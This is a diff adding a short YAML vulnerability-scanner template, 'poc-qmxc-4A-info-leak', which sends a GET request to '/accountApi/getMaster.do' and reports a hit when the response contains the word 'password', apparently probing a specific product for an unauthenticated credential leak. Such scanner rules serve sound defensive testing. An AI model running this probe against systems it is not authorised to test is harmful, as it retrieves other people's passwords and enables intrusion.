@@ -1,0 +1,8 @@
+name: poc-qmxc-4A-info-leak
+rules:
+  - method: GET
+    path: "/accountApi/getMaster.do"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'password')
+detail:
+  author: fliggy
